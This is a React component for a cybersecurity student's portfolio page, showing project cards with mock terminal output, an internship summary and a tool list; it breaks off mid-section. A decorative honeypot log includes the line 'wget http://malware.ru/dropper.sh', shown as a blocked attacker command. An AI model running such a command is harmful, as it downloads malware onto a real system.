import React, { useState } from 'react';
import { PORTFOLIO_DATA } from '../../data/portfolioData';
import { NavTab } from '../Navbar';
import { ProfilePhoto } from '../ProfilePhoto';

interface OverviewViewProps {
  onTabChange: (tab: NavTab) => void;
  onOpenResume: () => void;
}

export const OverviewView: React.FC<OverviewViewProps> = ({ onTabChange, onOpenResume }) => {
  const [activePortIndex, setActivePortIndex] = useState<number | null>(null);

  return (
    <div className="flex flex-col w-full text-[#1d1d1f]">
      {/* Apple Minimalist Ambient Hero Layer */}
      <div className="relative w-full overflow-hidden bg-gradient-to-b from-[#fbfbfd] to-white border-b border-[#e5e5ea]/60">
        <div className="absolute -top-32 left-1/2 -translate-x-1/2 w-[720px] h-[360px] bg-gradient-to-b from-blue-100/40 via-cyan-50/20 to-transparent blur-[100px] pointer-events-none -z-10 rounded-full"></div>

        {/* Hero Showcase Section */}
        <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-10 sm:pt-14 pb-14 sm:pb-20">
          <div className="flex flex-col lg:flex-row items-center lg:items-start justify-between gap-10 lg:gap-14 mb-12 sm:mb-16">
            {/* Left Column: Narrative & Action Calls */}
            <div className="flex flex-col items-center lg:items-start text-center lg:text-left max-w-2xl flex-1">
              {/* Super-headline / Overline Ribbon */}
              <div className="inline-flex items-center gap-2 bg-[#f5f5f7] border border-[#e5e5ea] px-3.5 py-1 rounded-full mb-6">
                <span className="w-2 h-2 rounded-full bg-[#0071e3] animate-pulse"></span>
                <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-wider">
                  Cybersecurity Undergraduate &amp; SOC Analyst
                </span>
                <span className="font-mono text-[11px] text-[#6e6e73] ml-1.5 hidden sm:inline">
                  ID: PC-9804
                </span>
              </div>

              {/* Cinematic Apple Title Hierarchy */}
              <h1 className="text-4xl sm:text-5xl md:text-6xl font-bold tracking-tight text-[#1d1d1f] mb-3">
                {PORTFOLIO_DATA.profile.name}
              </h1>

              <p className="text-xl sm:text-2xl md:text-[25px] font-medium tracking-tight text-[#6e6e73] mb-5">
                {PORTFOLIO_DATA.profile.tagline}
              </p>

              {/* Executive Narrative Summary */}
              <p className="text-[16.5px] sm:text-[17.5px] text-[#6e6e73] leading-relaxed max-w-2xl mb-8">
                {PORTFOLIO_DATA.profile.executiveSummary}
              </p>

              {/* Action CTAs */}
              <div className="flex flex-wrap items-center justify-center lg:justify-start gap-3 sm:gap-3.5 mb-8">
                <button
                  onClick={() => onTabChange('projects')}
                  className="inline-flex items-center justify-center bg-[#0071e3] text-white text-[14px] font-medium rounded-full px-6 py-2.5 hover:bg-[#0077ed] active:scale-[0.98] transition-all shadow-sm group"
                >
                  <span>Explore Work</span>
                  <span className="material-symbols-outlined text-[17px] ml-1.5 group-hover:translate-x-0.5 transition-transform">
                    arrow_forward
                  </span>
                </button>

                {/* Direct Telegram Message Button */}
                <a
                  href={PORTFOLIO_DATA.profile.socials.telegram}
                  target="_blank"
                  rel="noreferrer"
                  className="inline-flex items-center justify-center gap-2 bg-[#229ED9] hover:bg-[#1f8fc4] text-white text-[14px] font-medium rounded-full px-5 py-2.5 transition-all shadow-sm active:scale-[0.98]"
                  title="Direct Message @Pryn3 on Telegram"
                >
                  <svg viewBox="0 0 24 24" className="w-4 h-4 fill-current">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.75-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z" />
                  </svg>
                  <span>Telegram @Pryn3</span>
                </a>

                <button
                  onClick={onOpenResume}
                  className="inline-flex items-center justify-center bg-[#f5f5f7] text-[#1d1d1f] border border-[#e5e5ea] text-[14px] font-medium rounded-full px-5 py-2.5 hover:bg-[#e5e5ea] transition-all"
                >
                  <span className="material-symbols-outlined text-[18px] mr-1.5 text-[#0071e3]">
                    download
                  </span>
                  <span>Resume</span>
                </button>
              </div>

              {/* Status Indicator */}
              <div className="flex items-center gap-2 pl-1 py-1 text-center lg:text-left">
                <span className="w-2 h-2 rounded-full bg-[#28cd41]"></span>
                <span className="font-mono text-[12.5px] text-[#6e6e73]">
                  Open to Full-Time &amp; SOC Analyst Opportunities
                </span>
              </div>
            </div>

            {/* Right Column: Priyanshu Portrait Showcase Card */}
            <div className="shrink-0 flex flex-col items-center">
              <div className="relative p-2.5 bg-white/90 backdrop-blur-md rounded-3xl border border-[#e5e5ea] shadow-[0_12px_40px_rgba(0,0,0,0.06)] hover:shadow-[0_16px_50px_rgba(0,113,227,0.12)] transition-all">
                <ProfilePhoto
                  variant="hero"
                  showStatusIndicator={true}
                  className="shadow-sm"
                />

                {/* Sub-card metadata strip */}
                <div className="mt-3 px-3 py-2 bg-[#f5f5f7] rounded-xl border border-[#e5e5ea] flex items-center justify-between text-[11.5px] font-mono text-[#6e6e73] gap-3">
                  <div className="flex items-center gap-1.5 truncate">
                    <span className="material-symbols-outlined text-[15px] text-[#0071e3]">
                      location_on
                    </span>
                    <span>Jaipur, India</span>
                  </div>
                  <div className="flex items-center gap-1.5 text-[#229ED9] font-medium shrink-0">
                    <svg viewBox="0 0 24 24" className="w-3.5 h-3.5 fill-current">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.75-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z" />
                    </svg>
                    <span>@Pryn3</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Telemetry Stats Ribbon (Apple Clean Metric Tiers) */}
          <div className="w-full grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
            {PORTFOLIO_DATA.statHighlights.map((stat, idx) => (
              <div
                key={idx}
                className="bg-white border border-[#e5e5ea] rounded-xl p-4 sm:p-5 shadow-[0_2px_8px_rgba(0,0,0,0.03)] flex flex-col justify-between hover:border-[#d2d2d7] transition-all"
              >
                <div className="flex items-center justify-between text-[#6e6e73] mb-2">
                  <span className="text-[12px] uppercase tracking-wider font-semibold">
                    {stat.label}
                  </span>
                  <span className={`material-symbols-outlined text-[20px] ${stat.accentColor}`}>
                    {stat.icon}
                  </span>
                </div>
                <div className="text-2xl sm:text-[28px] font-bold text-[#1d1d1f] tracking-tight">
                  {stat.value}
                </div>
                <span className="text-[12px] text-[#6e6e73] mt-1 truncate">
                  {stat.subtext}
                </span>
              </div>
            ))}
          </div>
        </section>
      </div>

      {/* Featured Security Suites: Bento Grid Architecture */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-16 sm:py-20 w-full">
        <div className="flex flex-col md:flex-row md:items-end justify-between mb-10 gap-3">
          <div>
            <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-wider block mb-1">
              Systems Engineering
            </span>
            <h2 className="text-3xl sm:text-4xl font-bold tracking-tight text-[#1d1d1f]">
              Featured Security Suites.
            </h2>
          </div>
          <p className="text-[14px] text-[#6e6e73] max-w-md">
            Engineered defense architectures, automated enumeration tools, and malware disassembly pipelines built for tactical SOC precision.
          </p>
        </div>

        {/* Bento Grid Container */}
        <div className="grid grid-cols-1 md:grid-cols-12 gap-5 sm:gap-6">
          {/* Bento Card 1: 8 Columns Desktop (Dominant Showcase Card) */}
          <div className="md:col-span-8 bg-[#f5f5f7] border border-[#e5e5ea] rounded-2xl p-6 sm:p-8 shadow-[0_4px_20px_rgba(0,0,0,0.03)] flex flex-col justify-between relative overflow-hidden group">
            <div>
              <div className="flex flex-wrap items-center justify-between gap-2 mb-4">
                <div className="flex flex-wrap items-center gap-1.5">
                  <span className="bg-white border border-[#e5e5ea] text-[#0071e3] px-2.5 py-1 rounded-md font-mono text-[12px] font-medium">
                    Python 3.11
                  </span>
                  <span className="bg-white border border-[#e5e5ea] text-[#6e6e73] px-2.5 py-1 rounded-md font-mono text-[12px]">
                    Kali Linux
                  </span>
                  <span className="bg-white border border-[#e5e5ea] text-[#6e6e73] px-2.5 py-1 rounded-md font-mono text-[12px]">
                    Socket API
                  </span>
                </div>
                <div className="flex items-center gap-1.5 font-mono text-[12px] text-[#28cd41] font-semibold">
                  <span className="w-2 h-2 rounded-full bg-[#28cd41] animate-ping"></span>
                  ACTIVE RECON SUITE
                </div>
              </div>

              <h3 className="text-xl sm:text-2xl font-bold tracking-tight text-[#1d1d1f] mb-2">
                External Network Penetration Testing Suite
              </h3>
              <p className="text-[15px] text-[#6e6e73] leading-relaxed mb-5">
                High-throughput modular recon orchestrator executing multi-threaded socket-level port enumeration, protocol banner extraction, and CVE-heuristic payload mapping across class C subnets.
              </p>

              {/* Terminal Schematic Sandbox */}
              <div className="bg-white border border-[#e5e5ea] rounded-xl p-4 sm:p-5 shadow-sm font-mono text-[12.5px] sm:text-[13px]">
                <div className="flex items-center justify-between pb-3 mb-3 border-b border-[#f0f0f2]">
                  <div className="flex items-center gap-1.5">
                    <span className="w-2.5 h-2.5 rounded-full bg-[#ff5f56]"></span>
                    <span className="w-2.5 h-2.5 rounded-full bg-[#ffbd2e]"></span>
                    <span className="w-2.5 h-2.5 rounded-full bg-[#27c93f]"></span>
                    <span className="text-[#6e6e73] ml-2 text-[11px] sm:text-[12px]">
                      recon_agent_daemon.py — 192.168.1.0/24
                    </span>
                  </div>
                  <span className="text-[#86868b] text-[11px]">PID 4190</span>
                </div>

                <div className="space-y-1.5 text-[#1d1d1f] overflow-x-auto">
                  <p>
                    <span className="text-[#0071e3] font-semibold">[+] INITIALIZING:</span>{' '}
                    <span className="text-[#6e6e73]">Worker threads allocated: 64 sockets</span>
                  </p>
                  <p>
                    <span className="text-[#86868b]">02:14:19</span>{' '}
                    <span className="text-[#0071e3] font-semibold">PORT 22/TCP OPEN</span> • OpenSSH 8.9p1 Ubuntu (Banner grabbed)
                  </p>
                  <p>
                    <span className="text-[#86868b]">02:14:20</span>{' '}
                    <span className="text-[#0071e3] font-semibold">PORT 443/TCP OPEN</span> • TLS_AES_256_GCM_SHA384 / NGINX 1.18.0
                  </p>
                  <p className="bg-red-50/70 p-1 rounded border border-red-100">
                    <span className="text-[#86868b]">02:14:21</span>{' '}
                    <span className="text-[#d70015] font-bold">PORT 8080/TCP OPEN</span> • Apache Tomcat/9.0.30 →{' '}
                    <span className="text-[#f56300] font-bold">VULNERABILITY DETECTED [CVE-2020-1938]</span>
                  </p>
                  <p className="text-[#28cd41] font-semibold pt-1">
                    [✓] SYN-ACK telemetry aggregated in 1.482s. Remediation matrix published.
                  </p>
                </div>
              </div>
            </div>

            <div className="mt-6 flex items-center justify-between pt-4 border-t border-[#e5e5ea]">
              <span className="text-[12px] text-[#6e6e73]">
                Automated CVE-match telemetry pipeline
              </span>
              <button
                onClick={() => onTabChange('projects')}
                className="text-[13px] text-[#0071e3] hover:text-[#0077ed] font-medium inline-flex items-center gap-1"
              >
                <span>Explore Technical Specs</span>
                <span className="material-symbols-outlined text-[16px]">chevron_right</span>
              </button>
            </div>
          </div>

          {/* Bento Card 2: 4 Columns Desktop (Threat Detection Engine) */}
          <div className="md:col-span-4 bg-[#f5f5f7] border border-[#e5e5ea] rounded-2xl p-6 sm:p-7 shadow-[0_4px_20px_rgba(0,0,0,0.03)] flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between mb-4">
                <span className="bg-blue-50 text-[#0071e3] border border-blue-100 px-2.5 py-1 rounded-md font-mono text-[12px] font-medium">
                  Go • ELK Stack
                </span>
                <span className="material-symbols-outlined text-[#0071e3] text-[22px]">
                  monitor_heart
                </span>
              </div>
              <h3 className="text-lg sm:text-xl font-bold text-[#1d1d1f] mb-2">
                Automated Threat Detection Engine
              </h3>
              <p className="text-[13.5px] text-[#6e6e73] leading-relaxed mb-4">
                Real-time deep packet inspection pipeline. Ingests raw PCAP data via Wireshark hooks to correlate brute-force SSH anomalies and lateral movement.
              </p>

              {/* Inline Telemetry Waveform */}
              <div className="bg-white border border-[#e5e5ea] rounded-xl p-3.5 shadow-sm my-2">
                <div className="flex justify-between items-center mb-1 font-mono text-[11px] text-[#6e6e73]">
                  <span>PACKET INGESTION RATE</span>
                  <span className="text-[#28cd41] font-semibold">34.8 MB/s</span>
                </div>
                <svg
                  className="w-full h-16 text-[#0071e3]"
                  fill="none"
                  viewBox="0 0 240 60"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M0 45 L30 42 L60 48 L90 28 L120 32 L150 12 L180 38 L210 18 L240 22"
                    stroke="currentColor"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                  ></path>
                  <path
                    d="M0 45 L30 42 L60 48 L90 28 L120 32 L150 12 L180 38 L210 18 L240 22 L240 60 L0 60 Z"
                    fill="currentColor"
                    fillOpacity="0.08"
                  ></path>
                  <circle cx="150" cy="12" fill="#0071e3" r="3.5"></circle>
                </svg>
                <div className="flex items-center justify-between text-[11px] text-[#6e6e73] font-mono mt-1">
                  <span>Zero-Trust Gateways</span>
                  <span className="text-[#f56300] font-semibold">Anomaly Flagged</span>
                </div>
              </div>
            </div>

            <button
              onClick={() => onTabChange('projects')}
              className="text-[13px] text-[#0071e3] hover:text-[#0077ed] font-medium inline-flex items-center gap-1 mt-3"
            >
              <span>Review Detection Rulebooks</span>
              <span className="material-symbols-outlined text-[16px]">chevron_right</span>
            </button>
          </div>

          {/* Bento Card 3: 4 Columns Desktop (Reverse Engineering & Ghidra Decryptor) */}
          <div className="md:col-span-4 bg-[#f5f5f7] border border-[#e5e5ea] rounded-2xl p-6 sm:p-7 shadow-[0_4px_20px_rgba(0,0,0,0.03)] flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between mb-4">
                <span className="bg-orange-50 text-[#f56300] border border-orange-100 px-2.5 py-1 rounded-md font-mono text-[12px] font-medium">
                  C++ • Ghidra
                </span>
                <span className="material-symbols-outlined text-[#f56300] text-[22px]">
                  memory
                </span>
              </div>
              <h3 className="text-lg sm:text-xl font-bold text-[#1d1d1f] mb-2">
                Ransomware Decryption Tool
              </h3>
              <p className="text-[13.5px] text-[#6e6e73] leading-relaxed mb-3">
                Static binary analysis and assembly disassembly of malicious PE executables. Recovers cryptographic key schedules from process memory allocations.
              </p>

              {/* Assembly Disassembly Well */}
              <div className="bg-white border border-[#e5e5ea] rounded-xl p-3.5 shadow-sm font-mono text-[11.5px] space-y-1 text-[#6e6e73] my-2">
                <div className="text-[#1d1d1f]">
                  <span className="text-[#f56300] font-bold">MOV</span> EAX, [EBP-0x08] ; Seed
                </div>
                <div>
                  <span className="text-[#0071e3] font-semibold">XOR</span> EDX, EDX
                </div>
                <div>
                  <span className="text-[#0077ed] font-semibold">CALL</span> 0x004012A0 ; AES_Key_Gen
                </div>
                <div className="text-[#28cd41] font-semibold pt-0.5">
                  &gt; KEY EXTRACTED: 0x9F...A3E2
                </div>
              </div>
            </div>

            <button
              onClick={() => onTabChange('projects')}
              className="text-[13px] text-[#0071e3] hover:text-[#0077ed] font-medium inline-flex items-center gap-1 mt-3"
            >
              <span>Decompiled Schematics</span>
              <span className="material-symbols-outlined text-[16px]">chevron_right</span>
            </button>
          </div>

          {/* Bento Card 4: 8 Columns Desktop (Honeypot Decoy Telemetry Hub) */}
          <div className="md:col-span-8 bg-[#f5f5f7] border border-[#e5e5ea] rounded-2xl p-6 sm:p-8 shadow-[0_4px_20px_rgba(0,0,0,0.03)] flex flex-col justify-between relative overflow-hidden">
            <div>
              <div className="flex flex-wrap items-center justify-between gap-2 mb-3">
                <div className="flex flex-wrap items-center gap-1.5">
                  <span className="bg-white border border-[#e5e5ea] text-[#1d1d1f] px-2.5 py-1 rounded-md font-mono text-[12px] font-medium">
                    Docker Containers
                  </span>
                  <span className="bg-white border border-[#e5e5ea] text-[#6e6e73] px-2.5 py-1 rounded-md font-mono text-[12px]">
                    Cowrie SSH
                  </span>
                  <span className="bg-white border border-[#e5e5ea] text-[#6e6e73] px-2.5 py-1 rounded-md font-mono text-[12px]">
                    Logstash
                  </span>
                </div>
                <span className="font-mono text-[12px] text-[#6e6e73]">
                  NODE: HONEY-AP-SOUTH-1
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-5 items-center my-3">
                <div>
                  <h3 className="text-xl sm:text-2xl font-bold tracking-tight text-[#1d1d1f] mb-2">
                    Honeypot Telemetry Node
                  </h3>
                  <p className="text-[14.5px] text-[#6e6e73] leading-relaxed mb-3">
                    Containerized decoy ecosystem masquerading as exposed enterprise infrastructure. Real-time telemetry capturing threat actor payload drops, brute-force dictionaries, and post-exploitation scripts.
                  </p>
                  <div className="flex flex-wrap items-center gap-4 text-[12px] text-[#6e6e73]">
                    <span className="flex items-center gap-1.5 font-medium">
                      <span className="w-2 h-2 rounded-full bg-[#d70015]"></span> 1,842 Attacks Intercepted
                    </span>
                    <span className="flex items-center gap-1.5 font-medium">
                      <span className="w-2 h-2 rounded-full bg-[#28cd41]"></span> Zero Host Contamination
                    </span>
                  </div>
                </div>

                {/* Decoy Live Feed Visual Container */}
                <div className="bg-white border border-[#e5e5ea] rounded-xl p-4 shadow-sm font-mono text-[12px]">
                  <div className="text-[11px] text-[#6e6e73] uppercase tracking-wider mb-2 flex items-center justify-between font-semibold">
                    <span>Trap Logs</span>
                    <span className="text-[#d70015] font-bold">HONEYPOT TRIPPED</span>
                  </div>
                  <div className="space-y-1 text-[#1d1d1f]">
                    <p>
                      <span className="text-[#f56300] font-semibold">SRC:</span> 185.220.101.5 [TOR Exit Node]
                    </p>
                    <p>
                      <span className="text-[#6e6e73]">CMD:</span>{' '}
                      <span className="text-[#1d1d1f] font-semibold">wget http://malware.ru/dropper.sh</span>
                    </p>
                    <p className="text-[#0071e3] font-medium">
                      PAYLOAD: Blocked &amp; Quarantined SHA-256
                    </p>
                    <p className="text-[#6e6e73]">&gt; Session sandbox isolated in 12ms</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex items-center justify-between pt-4 border-t border-[#e5e5ea]">
              <span className="text-[12px] text-[#6e6e73]">
                Active Threat Intelligence Harvester
              </span>
              <button
                onClick={() => onTabChange('projects')}
                className="text-[13px] text-[#0071e3] hover:text-[#0077ed] font-medium inline-flex items-center gap-1"
              >
                <span>Explore Telemetry Logbook</span>
                <span className="material-symbols-outlined text-[16px]">chevron_right</span>
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Photographic Context & Security Rigor Break */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12 w-full">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          {/* Card 1 */}
          <div className="bg-white border border-[#e5e5ea] rounded-2xl p-5 shadow-[0_2px_12px_rgba(0,0,0,0.03)] flex flex-col justify-between hover:shadow-[0_6px_20px_rgba(0,0,0,0.06)] transition-all">
            <div className="h-44 w-full rounded-xl overflow-hidden mb-4 relative border border-[#e5e5ea] bg-slate-900">
              <img
                className="w-full h-full object-cover"
                alt="Network Packet Anatomy Visualization"
                src={PORTFOLIO_DATA.profile.images.networkPacketAnatomy}
                loading="lazy"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/20 via-transparent to-transparent pointer-events-none"></div>
            </div>
            <div>
              <span className="text-[11px] uppercase font-semibold text-[#0071e3] tracking-wider mb-1 block">
                Defense Vector
              </span>
              <h4 className="text-lg font-bold text-[#1d1d1f] mb-2">
                Network Packet Anatomy
              </h4>
              <p className="text-[13.5px] text-[#6e6e73] leading-relaxed">
                Low-level packet parsing utilizing raw sockets, capturing handshake anomalies and mitigating zero-day exfiltration paths.
              </p>
            </div>
          </div>

          {/* Card 2 */}
          <div className="bg-white border border-[#e5e5ea] rounded-2xl p-5 shadow-[0_2px_12px_rgba(0,0,0,0.03)] flex flex-col justify-between hover:shadow-[0_6px_20px_rgba(0,0,0,0.06)] transition-all">
            <div className="h-44 w-full rounded-xl overflow-hidden mb-4 relative border border-[#e5e5ea] bg-slate-900">
              <img
                className="w-full h-full object-cover"
                alt="Kernel and Exploit Memory Analysis"
                src={PORTFOLIO_DATA.profile.images.kernelExploitAnalysis}
                loading="lazy"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/20 via-transparent to-transparent pointer-events-none"></div>
            </div>
            <div>
              <span className="text-[11px] uppercase font-semibold text-[#f56300] tracking-wider mb-1 block">
                Offensive Testing
              </span>
              <h4 className="text-lg font-bold text-[#1d1d1f] mb-2">
                Kernel &amp; Exploit Analysis
              </h4>
              <p className="text-[13.5px] text-[#6e6e73] leading-relaxed">
                Dissecting compiled executable memory pools in controlled virtual environments to audit stack integrity and prevent buffer overflows.
              </p>
            </div>
          </div>

          {/* Card 3 */}
          <div className="bg-white border border-[#e5e5ea] rounded-2xl p-5 shadow-[0_2px_12px_rgba(0,0,0,0.03)] flex flex-col justify-between hover:shadow-[0_6px_20px_rgba(0,0,0,0.06)] transition-all">
            <div className="h-44 w-full rounded-xl overflow-hidden mb-4 relative border border-[#e5e5ea] bg-slate-900">
              <img
                className="w-full h-full object-cover"
                alt="Security Operations Center Workstation"
                src={PORTFOLIO_DATA.profile.images.incidentCorrelationResponse}
                loading="lazy"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/20 via-transparent to-transparent pointer-events-none"></div>
            </div>
            <div>
              <span className="text-[11px] uppercase font-semibold text-[#28cd41] tracking-wider mb-1 block">
                SOC Operation
              </span>
              <h4 className="text-lg font-bold text-[#1d1d1f] mb-2">
                Incident Correlation &amp; Response
              </h4>
              <p className="text-[13.5px] text-[#6e6e73] leading-relaxed">
                Aggregating Syslog, SIEM, and perimeter firewall triggers into actionable incident response timelines with zero telemetry noise.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Experience Snapshot: Apple Timeline Bento Section */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-16 sm:py-20 w-full">
        <div className="flex flex-col md:flex-row md:items-end justify-between mb-8 gap-3">
          <div>
            <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-wider block mb-1">
              Operational Track Record
            </span>
            <h2 className="text-3xl sm:text-4xl font-bold tracking-tight text-[#1d1d1f]">
              Internship &amp; Field Experience.
            </h2>
          </div>
          <button
            onClick={() => onTabChange('experience')}
            className="text-[14px] text-[#0071e3] hover:text-[#0077ed] font-medium inline-flex items-center gap-1 self-start md:self-auto"
          >
            <span>View Full Career Trajectory</span>
            <span className="material-symbols-outlined text-[16px]">arrow_forward</span>
          </button>
        </div>

        <div className="bg-[#f5f5f7] border border-[#e5e5ea] rounded-2xl p-6 sm:p-10 shadow-[0_4px_20px_rgba(0,0,0,0.03)] relative overflow-hidden">
          <div className="flex flex-col lg:flex-row lg:items-start justify-between gap-8">
            {/* Organization & Core Details */}
            <div className="lg:w-1/3">
              <div className="inline-flex items-center gap-2 bg-white border border-[#e5e5ea] px-3 py-1 rounded-full text-[12px] font-mono text-[#6e6e73] mb-4">
                <span>3-MONTH FIELD INTERNSHIP</span>
              </div>
              <div className="flex items-center gap-3.5 mb-2">
                <ProfilePhoto variant="badge" className="w-12 h-12 rounded-xl shadow-xs shrink-0" />
                <div>
                  <h3 className="text-2xl font-bold text-[#1d1d1f] leading-tight">
                    Eduversity
                  </h3>
                  <p className="text-[14px] text-[#0071e3] font-semibold">
                    Cybersecurity Intern • Priyanshu
                  </p>
                </div>
              </div>
              <p className="text-[13px] text-[#6e6e73] mb-5">
                Specialization: Threat Assessment &amp; Hardening
              </p>
              <div className="space-y-2 text-[#6e6e73] text-[13.5px]">
                <div className="flex items-center gap-2">
                  <span className="material-symbols-outlined text-[18px] text-[#0071e3]">location_on</span>
                  <span>Jaipur, Rajasthan, India</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="material-symbols-outlined text-[18px] text-[#0071e3]">verified_user</span>
                  <span>Controlled Red Team Scope</span>
                </div>
              </div>
            </div>

            {/* Accomplishments & Scope in Depth */}
            <div className="lg:w-2/3 space-y-4">
              <div className="bg-white border border-[#e5e5ea] rounded-xl p-5 shadow-sm">
                <h4 className="text-[15px] font-bold text-[#1d1d1f] mb-1.5 flex items-center gap-2">
                  <span className="material-symbols-outlined text-[#0071e3] text-[20px]">radar</span>
                  Vulnerability Audits &amp; Infrastructure Scans
                </h4>
                <p className="text-[13.5px] text-[#6e6e73] leading-relaxed">
                  Audited enterprise staging subnets utilizing Nmap scripting engine (NSE) and Metasploit. Identified 14 high-severity configuration discrepancies across unpatched internal services.
                </p>
              </div>

              <div className="bg-white border border-[#e5e5ea] rounded-xl p-5 shadow-sm">
                <h4 className="text-[15px] font-bold text-[#1d1d1f] mb-1.5 flex items-center gap-2">
                  <span className="material-symbols-outlined text-[#0077ed] text-[20px]">assignment_turned_in</span>
                  Defensive Hardening &amp; Remediation Playbooks
                </h4>
                <p className="text-[13.5px] text-[#6e6e73] leading-relaxed">
                  Authored structured threat remediation documentation adopted by network administrators to enforce SSH key authentication, close orphaned ports, and configure perimeter iptables rules.
                </p>
              </div>

              <div className="flex flex-wrap gap-2 pt-1">
                {['Nmap', 'Metasploit', 'Wireshark', 'Linux Hardening', 'CVSS 3.1 Scoring'].map((tag, idx) => (
                  <span
                    key={idx}
                    className="bg-white border border-[#e5e5ea] text-[#6e6e73] font-mono text-[11.5px] px-3 py-1 rounded-md"
                  >
                    {tag}
                  </span>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Technical Arsenal & Toolchain Overview */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-16 sm:py-20 w-full">
        <div className="text-center max-w-2xl mx-auto mb-12">
          <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-wider block mb-1">
            Engineered Competencies
          </span>
          <h2 className="text-3xl sm:text-4xl font-bold tracking-tight text-[#1d1d1f]">
            The Security Arsenal.
          </h2>
          <p className="text-[15px] text-[#6e6e73] mt-2">
            A calibrated toolchain spanning low-level language systems, exploit engines, and operational SOC SIEM platforms.
          </p>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-5">
          {/* Category 1 */}
          <div className="bg-white border border-[#e5e5ea] rounded-2xl p-5 shadow-[0_2px_12px_rgba(0,0,0,0.03)] hover:border-[#d2d2d7] transition-all">
            <div className="w-10 h-10 rounded-xl bg-blue-50 border border-blue-100 flex items-center justify-center text-[#0071e3] mb-4">
              <span className="material-symbols-outlined text-[22px]">code</span>
            </div>
            <h3 className="text-lg font-bold text-[#1d1d1f] mb-3">Languages</h3>
            <ul className="space-y-2.5 text-[13.5px] text-[#6e6e73]">
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Python</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Scripts &amp; Scrapers</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">C / C++</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Memory &amp; Binaries</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Bash Scripting</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Linux Automation</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Go (Golang)</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">High-concurrency</span>
              </li>
            </ul>
          </div>

          {/* Category 2 */}
          <div className="bg-white border border-[#e5e5ea] rounded-2xl p-5 shadow-[0_2px_12px_rgba(0,0,0,0.03)] hover:border-[#d2d2d7] transition-all">
            <div className="w-10 h-10 rounded-xl bg-cyan-50 border border-cyan-100 flex items-center justify-center text-[#0077ed] mb-4">
              <span className="material-symbols-outlined text-[22px]">bug_report</span>
            </div>
            <h3 className="text-lg font-bold text-[#1d1d1f] mb-3">Offensive Security</h3>
            <ul className="space-y-2.5 text-[13.5px] text-[#6e6e73]">
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Metasploit Pro</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Exploitation</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Burp Suite</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Web App Sec</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Ghidra / IDA</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Decompilers</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Nmap / Masscan</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Port Scanners</span>
              </li>
            </ul>
          </div>

          {/* Category 3 */}
